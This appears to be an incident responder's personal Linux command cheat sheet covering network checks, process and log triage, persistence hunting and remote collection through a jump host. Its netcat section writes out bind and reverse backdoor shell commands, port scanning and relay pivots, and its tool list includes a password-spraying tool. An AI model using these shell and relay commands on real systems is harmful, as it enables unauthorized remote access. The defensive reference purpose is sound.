# Unix/Ubuntu Bash Notes & Cheat Sheet 
Notes last updated: 4.10.2024


# NETWORK INTERFACE INFO 
Network Interface Information   
``` 
ip addr show
```

show all ip info 
```
ip a
``` 

Show ip info - requires net-utils is installed
 ```
ifconfig 
```


# NETSTAT COMMANDS
* requires "net-tools" to be installed  (sudo apt install -y net-tools)

closest to netstat-naob on windows 
```
netstat -apnvtu
```

```
sudo netstat -tup
```

```
netstat -nao
```

add 'c' for continuos. Add grep to watch for a connection
```
netstat -apnvtuc
``` 

get a live list of processes & network connections. Remove 'c' to get a static list. 
```
netstat -A inet -pc
```


# RUNNING PROCESSES
show running process
```
 ps aux
```


# List Open Files - (Handles) 
 Show list of open handles
```
lsof
```

list open files with network connections
```
lsof -i
```

List open files that are completely unlinked   
```
lsof +L1
```

   
# KILL PROCESSES
Kill multi processes at once 
```
pgrep <processName> | xargs kill
```

Kill multi processes at once by name
```
killall -9 <mattermost-desktop>
```
 
kill a process by its pid 
```
 Kill -9 <pid>
```
Example: kill -9 7154 7192 7210 7227 10248 10296 10386 10391 10405 10422

kill all processes by a user 
```
killall -u <username>
```
Example: killall -u user1


# SUDO Access per User 
Remove the user from the sudo group 
```
sudo deluser USERNAME sudo
```

Grant a user SUDO access    
```
sudo usermod -aG sudo $UserName
```


# LIST STARTUP ITEMS

```
ls -la /etc/init
```

```
 ls -la /etc/init.conf
```

```
ls -la /etc/rc.d
```
   

```
ls -la /etc/init.d
```
   

```
cat /etc/inittab
```


#LIST CRON JOBS 
   LIST Crons: 
 ```
cat /etc/crontab
```
```
ls -la /etc/cron.monthly/
```
```
ls -la /etc/cron.weekly/
```
```
ls -la /etc/cron.daily/
```
```
ls -la /etc/cron.hourly/
```

# LIST INSTALLED APPS   
List apps installed via snap 
```
snap list
```

list installed apps via apt 
```
apt list --installed
```


```
grep " install " /var/log/apt/history.log
```

```
grep " install " /var/log/dpkg.log
```

```
sudo dpkg --get-selections | grep -v deinstall
```


# Searching Finding & Sorting

```
 grep
```
   
```
zgrep
```
 
```
egrep
```
Example: egrep -ir --include=*.{docx} "jacking"
         egrep -ir --include=*.{html} "jacking"
         egrep -ir --include=*.{html} "clickjacking"

use 'find' to find a file on a unix system. 
```
find
```
Example: find ./ -type f -name "*.cert"
         find . -type f -name ".html"
         find . -type f -name "*.html"
         find . -type f -name "*.html" | grep -i report
         find ./ -type f -name "*.opvn"
         find ./ -type f -name "opravpn*"
         find ./ -type f -name "*vpn*"
         find . -type f -name "*.kdbx"
         find ~/ -iname "*.txt" 
         find ~/ -iname "* sSn*" 


# LIST MOUNTED FILES, DRIVES, Block Devices
List all mounted files and drives 
```
ls -lat /mnt
```

List all File Systems    
```
df -h | grep -v snap
```

list info about block devices 
```
lsblk
```
   
List the FileSystem Type of an img file. 'blkid' - will return the fs type or nothing if it's raw data   
```
sudo blkid -o value -s TYPE ./sda3.dd-ptcl-img
``` 
Dependant: sudo apt-get install vmfs-tools -- ESXi datastores use VMware’s proprietary VMFS filesystem.


# MOUNT/UNMOUNT IMGAGES, DRIVES, BLOCK DEVICES
```
sudo losetup -f -P ./img.dd
```
```
sudo losetup --detach /dev/loop2
```
https://askubuntu.com/questions/483009/mounting-disk-image-in-raw-format


# Archives and Zips
```
zip
```
Example: zip --encrypt zipArchive.zip ./file
         zip -er File.zip ./File

```
7z x
```

```
7z a
```


# clamscan - ClamAV
```
clamscan -r -i ./
```

```
clamscan -r --remove /media/ajablonow/SOCTeam/
```
   

```
clamscan -r -i --bell ./
```
   

```
freshclam
```

# UFW - FIREWALL
      https://www.digitalocean.com/community/tutorials/how-to-setup-a-firewall-with-ufw-on-an-ubuntu-and-debian-cloud-server
      sudo aptitude install ufw
      sudo ufw status
      IPV6 - https://itsfoss.com/disable-ipv6-ubuntu-linux/


# SSH & SSH Keypairs
The order of precedence for SSH config is as follows:
  1. Command-line arguments
  2. User config file (`~/.ssh/config`)
  3. System config file (`/etc/ssh/ssh_config`)

Resourses:
   Setup - https://www.ssh.com/ssh/public-key-authentication
   ciphers - https://infosec.mozilla.org/guidelines/openssh.html

* Disable password logins on server (optional)
    sudo nano /etc/ssh/sshd_config
        # Change to no to disable tunnelled clear text passwords
            #PasswordAuthentication yes
        Uncomment the second line, and, if needed, change yes to no.
            PasswordAuthentication no 

Generate an SSH Key (both pub/priv).	 
```
ssh-keygen -t ed25519 -f ~/.ssh/your-key-filename -C "your-key-comment"
```
Generate an SSH Key (both pub/priv).
```
ssh-keygen -f ./keyName_alg -t ecdsa -b 521
```

add public key to user's authorized_keys file
```
Command: ssh-copy-id -i ./keyName_alg.pub User@host 
```
 
Command: ssh-add ~/.ssh/path/to/privkey
   Info: add a private key to the ssh-agent

.ssh permissions 
    chmod 700 $HOME/.ssh 
    chmod 644 ~/.ssh/authorized_keys
    chmod 644 ~/.ssh/pulic_key.pub
    chmod 600 ~/.ssh/private_key #If Keys need to be read-writable by you
    chmod 400 ~/.ssh/private_key #Keys need to be only readable by you.



=============================
POSIX ACLs & File Permissions
=============================
Command: setfacl -m user:tom:rwx /home/samantha/folder
   Info: Give tom access to folder     

Permissions Guide: USER-GROUP-ALL 
Number	Permission Type	      Symbol
0	      No Permission	         ===
1	      Execute	                 --x
2	      Write	                 -w-
3	      Execute + Write	         -wx
4	      Read	                 r--
5	      Read + Execute	         r-x
6	      Read +Write	         rw-
7	      Read + Write +Execute	 rwx

r = read permission
w = write permission
x = execute permission
- = no permission

LINK: https://www.guru99.com/file-permissions.html



============================
Lynis Audit - Security check 
============================
Command: sudo lynis audit system | tee ~/lynis_output_log.txt && sudo cp /var/log/lynis.log ~/lynis.log && sudo chown ajablonow:ajablonow ~/lynis.log


=============
System Checks
=============

Command: cat /sys/module/ipv6/parameters/disable
Info: Check if IPv6 is enabled 

Command: sysctl -a 2>/dev/null | grep disable_ipv6
Info: Check if IPv6 is enabled (**prefered) 

================
Check Desktop UI
================
echo $XDG_SESSION_TYPE  ## echo the current UI 
sudo nano /etc/gdm3/custom.conf
	uncomment "#WaylandEnable=false"



<=================================================================================================================>


============
GIT Commands
============
Command: git clone 
   Info: 

Command: 
   Info:    

Command: 
   Info:    

Command: 
   Info:    

Command: 
   Info:    

============
GIT Packages
============
        git clone https://github.com/sans-blue-team/DeepBlueCLI.git
        git clone https://github.com/elceef/dnstwist.git
        git clone https://github.com/decalage2/oletools.git
        git clone https://github.com/sleuthkit/autopsy.git
        git clone https://github.com/dafthack/DomainPasswordSpray.git
        

<===================================================================================>
    ===============-
    LOGS & Locations  
    ===============-
    
#cron logs 
    cat /var/log/cron.log
    cat /var/log/sudo.log 
    cat /var/log/messages 

#mail server logs 
    cat /var/log/maillog

#kernal logs 
    cat /var/log/kern.log
    cat /var/log/auth.log 

#apache access and error logs directory 
la -la /var/log/httpd/

<=================================================================================================================>
    
    =========================
    One Liners, Tips & Tricks
    =========================

Command: sort /etc/passwd -nk3 -t: | less
	 cat /etc/passwd | sort -nk3 -t:
   Info: Look in etc passwd for new accounts sorted by UID. UID less than 500 = SUSPECT. 

Command: getent passwd | egrep ':0+:'
Command: egrep ':0+:' /etc/passwd
Command: grep :0: /etc/passwd
   Info: Find any unexpected UID 0 accounts (root)

Command: sensors 
   info: get cpu temps - sudo apt install lm-sensors -y && sudo sensors-detect 
 source: cyberciti.biz/faq/how-to-check-cpu-temperature-on-ubuntu-linux/ 

Command: find / -nouser -print
    Info: Look for orphaned files, which could be a sign of an attacker's temp account that has been deleted 

Command: nmcli device show <interFaceName> | grep IP4.DNS

Command: uptime
   Info: Look at uptime and load average 

Command: free
   Info: Look for excesive Memory use 

Command: df -h | grep -vi snap 
   Info: Look at disk usage (minus snaps)

Command: ps aux | grep root 
   Info: Find odd processes running as root user (UID 0)

Command: lsof –p [pid]
   Info: Investigate a discovered PID in more depth 

Command: find / -uid 0 -perm 4000 -print
   Info: Look for unusual SUID root files 

Command: find / -size +10000k –print
   Info: Look for unusually large files (gt 10MB)

Command: find / -name ".. " –print
Command: find / -name ". " –print
Command: find / -name " " –print
Command: find / -name “ “ –print
Command: find / -regex '.+[^A-Za-z0-9(+=_-/.,!@#$%^&*~:;)]' -print
   Info: Look for files with dots and spaces, used to camouflage files 

Command: lsof +L1
   Info: Look for processes running out of or accessing files that have been unlinked (ie. link count 0). 
         An attacker may be hiding data in or running a backdoor from such a file 

Command: ip link | grep PROMISC
   Info: Look for promiscuous mode, which may indicate a sniffer 

Command: netstat –nap
   Info: Look for unusual TCP/UDP listeners 

Command: lsof –i
   Info: Get more details about running processes listening on ports 

Command: arp –a
   Info: Look for unusual ARP entries 

Command: crontab –u root –l
   Info: Look for cron jobs scheduled as root or any other UID 0 accoutns 

Command: cat /etc/crontab
Command: ls /etc/cron.*
   Info: Look for unusual system wide cron jobs    

Command: lastlog 
   Info: List last login for each user 
         [read with lastlog]

Command: Command: last -f /var/log/wtmp
   Info: user logins and system reboots. File may be truncated weekly or monthly
         Look for rolled logs too (ll /var/log/ | grep -i wtmp).

Command: lastb -f /var/log/btmp | less 
   Info: Failed Logins. May not be kept due to risk of password disclosure. 

Command: grep 'sshd' /var/log/auth.log
Command: tail -n 500 /var/log/auth.log | grep 'sshd'   (last 500 logs)
Command: tail -f -n 500 /var/log/auth.log | grep 'sshd'   (live view)
   Info: SSH auth failures are logged here /var/log/auth.log
   Link: https://serverfault.com/questions/130482/how-to-check-sshd-log

Command: ausearch -if /path/to/evidence/var/log/audit.log -c useradd
   Info: Find users that have been added to they system 

Command: cat bigFile.csv | parallel --header : --pipe -N999 'cat >split_file_{#}.csv'
   Info: Split large CSV file into many with 999 rows, and keep the headers. 
   
Command: split -d -l 10000 file_name.csv file_part_
file_name = Name of the file you want to split.
10000 = Number of rows each split file would contain
file_part_ = Prefix of split file name (file_part_0,file_part_1,file_part_2..etc goes on)



    ============--
    OTHER COMMANDS 
    ============--

#Indentify all modified or accessed files 
find  

#Display enviroment variables 
env

#Display alias
alias 

#Check For Hardware Events
dmesg | grep hd

#DiskUsage
df -ah

# Virtual Memory Statistics  
vmstat

#list last logged in users
lastlog

#list last logged in users
last

Command: w    
   info: list last logged in users


SORT
===-
uname -a
cat /etc/fstab
flatpack list
#users 
cat /etc/passwd
# Show host information  
cat /etc/hosts 
lsblk
sudo dd bs=4m if=./ubuntu-18.04.4-desktop-amd64.iso of=/dev/sdc
ls -AlF /var/lib/dpkg/info/
ll /var/lib/dpkg/info/ | grep -i '.list'
pkill
dpkg --get-selections 
grep install /var/log/dpkg.log /var/log/dpkg.log.1
pgrep
ip route show
  313  ip route get ipaddress
  314  ip route show

file 
iftop
htop
wget
curl 
strings 
update-manager -d


   ===============
   NetCat Commands
   ===============
#Netcat Command Flags
=====================   
$ nc [options] [TargetIPaddr] [port(s)]
The [TargetIPaddr] is simply the other side’s IP
address or domain name. It is required in client mode
of course (because we have to tell the client where to
connect), and is optional in listen mode.
-l: Listen mode (default is client mode)
-L: Listen harder (supported only on Windows
version of Netcat). This option makes Netcat a
persistent listener which starts listening again
after a client disconnects
-u: UDP mode (default is TCP)
-p: Local port (In listen mode, this is port listened
on. In client mode, this is source port for all
packets sent)
-e: Program to execute after connection occurs,
connecting STDIN and STDOUT to the
program
-n: Don’t perform DNS lookups on names of
machines on the other side
-z: Zero-I/O mode (Don’t send any data, just emit
a packet without payload)
-wN: Timeout for connects, waits for N seconds
after closure of STDIN. A Netcat client or
listener with this option will wait for N seconds
to make a connection. If the connection
doesn’t happen in that time, Netcat stops
running.
-v: Be verbose, printing out messages on
Standard Error, such as when a connection
occurs
-vv: Be very verbose, printing even more details
on Standard Error

#basics
======-
Fundamental Netcat Client:
   $ nc [TargetIPaddr] [port]   
Fundamental Netcat Listener:
   $ nc –l -p [LocalPort]
Both the client and listener take input from STDIN
and send data received from the network to STDOUT

#File transfer using NetCat
===========================
Push a file from client to listener:
   $ nc –l -p [LocalPort] > [outfile]
Listen on [LocalPort], store results in [outfile]
   $ nc –w3 [TargetIPaddr] [port] <[infile]
Push [infile] to [TargetIPaddr] on [port]
Pull file from listener back to client:
   $ nc –l -p [LocalPort] < [infile]
Listen on [LocalPort], prep to push [infile]
   $ nc –w3 [TargetIPaddr] [port] > [outfile]
Connect to [TargetIPaddr] on [port] and retrieve [outfile]

# TCP Port Scanner
==================
Port scan an IP Address:
$ nc –v –n –z –w1 [TargetIPaddr]
[start_port]-[end_port]
Attempt to connect to each port in a range from
[end_port] to [start_port] on IP Address
[TargetIPaddr] running verbosely (-v on Linux, -
vv on Windows), not resolving names (-n), without
sending any data (-z), and waiting no more than 1
second for a connection to occur (-w1)
The randomize ports (-r) switch can be used to
choose port numbers randomly in the range

#TCP Banner Grabber
==================-
Grab the banner of any TCP service running on an IP
Address from Linux:
$ echo "" | nc –v –n –w1 [TargetIPaddr]
[start_port]-[end_port]
Attempt to connect to each port in a range from
[end_port] to [start_port] on IP Address
[TargetIPaddr] running verbosely (-v), not
resolving names (-n), and waiting no more than 1
second for a connection to occur (-w1). Then send a
blank string to the open port and print out any
banner received in response
Add –r to randomize destination ports within the
range
Add –p [port] to specify a source port for the

#Backdoor Shells
===============-
Listening backdoor shell on Linux:
   $ nc –l –p [LocalPort] –e /bin/bash
Listening backdoor shell on Windows:
   C:\> nc –l –p [LocalPort] –e cmd.exe
Create a shell on local port [LocalPort] that can then be accessed using a fundamental Netcat client
Reverse backdoor shell on Linux:
   $ nc [YourIPaddr] [port] –e /bin/bash
Reverse backdoor shell on Windows:
   C:\> nc [YourIPaddr] [port] –e cmd.exe
Create a reverse shell that will attempt to connect to
[YourIPaddr] on local port [port]. This shell
can then be captured using a fundamental nc listener

#Netcat Relays on Linux
=====================--
To start, create a FIFO (named pipe) called backpipe:
   $ cd /tmp
   $ mknod backpipe p
Listener-to-Client Relay:
   $ nc –l –p [LocalPort] 0<backpipe | nc [TargetIPaddr] [port] | tee backpipe
Create a relay that sends packets from the local port [LocalPort] to a Netcat client connected to [TargetIPaddr] on port [port]
Listener-to-Listener Relay:
   $ nc –l –p [LocalPort_1] 0<backpipe | nc –l –p [LocalPort_2] | tee backpipe
Create a relay that sends packets from anyconnection on [LocalPort_1] to any connection on [LocalPort_2]

Client-to-Client Relay:
   $ nc [PreviousHopIPaddr] [port] 0<backpipe | nc [NextHopIPaddr] [port2] | tee backpipe

Create a relay that sends packets from the connection to [PreviousHopIPaddr] on port [port] to a Netcat client connected to [NextHopIPaddr] on port [port2]


   ======--
   TCP Dump 
   ======--
   
   =========
   SNORT IDS
   =========

   ===
   BRO 
   ===


   ================
   List our Drivers 
   ================
   


1515  sudo vmware-installer -u vmware-player
sudo sh ./VMware-Horizon-Client-x.x.x-yyyyyyy.arch.bundle

List Symbolic LInks in a dir 
   find . -maxdepth 1 -type l -ls


# Remnux - VMWare make share folder available (run on guest)
### https://askubuntu.com/questions/29284/how-do-i-mount-shared-folders-in-ubuntu-using-vmware-tools
   sudo vmhgfs-fuse .host:/ /mnt/hgfs/ -o allow_other -o uid=1000



============================
Commands through a Jump host
============================

-- DNS LOGS -- 
Command: ssh storegw ssh {StoreServerIP} sudo zgrep query /var/log/dnsmasq.* > ~/Documents/DNS_queries.txt 
	 ssh storegw ssh 10.40.48.254 sudo zgrep query /var/log/dnsmasq.*  | cut -d ':' -f5 | cut -d ' ' -f3 | sort | uniq -c | sort -nr > ~/Documents/DNS_Logs_Stacked.txt
	 ssh storegw ssh 10.40.48.254 sudo zgrep query /var/log/dnsmasq.* | grep -i -E "chatvisor|screenconnect|teamview|anydesk|example.com" | sort > ~/Documents/DomainLookup_report.txt
   Info: 
Example: 


-- NETWORK CONNECTIONS -- 
Command: ssh storegw ssh {storeserverip} sudo lsof -i | grep ESTABLISHED > ~/Documents/lsof_i.log
	 ssh storegw ssh {storeserverip} sudo lsof -i -n -P
	 ssh storegw ssh {storeserverip} sudo netstat -apnvtu | grep -i estab
	 
-- HOST FILE -- 
Command: ssh storegw ssh {storeserverip} cat /etc/hosts
   Info: 
Example: 

-- RUNNING PROCESSES -- 
Command: ssh storegw ssh {storeServerIP} sudo ps aux
   Info: 
Example: 

-- BASH HISTORY FOR ALL USERS (not through Jump Host) -- 
	ssh storegw
	ssh {storeserverip}
	sudo su
	getent passwd | cut -d : -f 6 | sed 's:$:/.bash_history:' | xargs -d '\n' grep -s -H -e "$pattern"
 
-- LIST USERS -- 
Command: ssh storegw ssh {storeserverip}  cat /etc/passwd | grep -v "nologin" | grep -v "false"| grep -v "sync"
	 ssh storegw ssh {storeserverip} w
   Info: 
Example: 

-- MOST RECENT LOGINS -- 
Command: ssh storegw ssh {storeserverip} last
   Info: 
Example: 

	
-- List init* & rc.d -- 
inittab: ssh storegw ssh {storeserverip} sudo ls -la /etc/inittab
init.d: ssh storegw ssh {storeserverip} sudo ls -la /etc/init.d
rc.d: ssh storegw ssh {storeserverip} sudo ls -la /etc/rc.d
init.conf: ssh storegw ssh {storeserverip} sudo ls -la /etc/init.conf
init: ssh storegw ssh {storeserverip} sudo ls -la /etc/init

-- AUTH LOGS -- 
ssh storegw ssh {storeserverip} sudo cat /var/log/auth.log
ssh storegw ssh {storeserverip} sudo cat /var/log/auth.log | grep -i Accepted | cut -d ':' -f4 | cut -d' ' -f5 | sort | uniq -c | sort -nr
ssh storegw ssh {storeserverip} sudo cat /var/log/auth.log | grep -i Accepted | cut -d ':' -f4 | cut -d' ' -f7 | sort | uniq -c | sort -nr
ssh storegw ssh {storeserverip} sudo cat /var/log/auth.log | grep -i Accepted | cut -d ':' -f4 | cut -d' ' -f5,7 | sort | uniq -c | sort -nr
ssh storegw ssh {storeserverip} sudo cat /var/log/auth.log | grep -E 'sshd.*Failed|Invalid|failure'

-- List the top 25 largest files on the server -- 
ssh storegw ssh {storeserverip} sudo find /home -printf '%s\\\ %p\\\\n'| sort -nr | head -25

-- rsync files from store server to local host: 

-On the store server:
sudo su
cp /file/location/filename /home/{yourUsername}/
cd /home/{yourUserName}
chown {yourUsername} {filename}
If dealing with multiple files or a directory, zip the contents of the directory first. Then rsync it to your system. 

-On Analyst Workstation: 
rsync -v -r -e "ssh storegw ssh" {storeServerIP}:/home/{yourUserName}/{FileName} ~/temp/IR
rsync -v -e "ssh storegw ssh" 10.16.33.254:/home/ajablonow/someArchive.zip ~/Documents/IR/


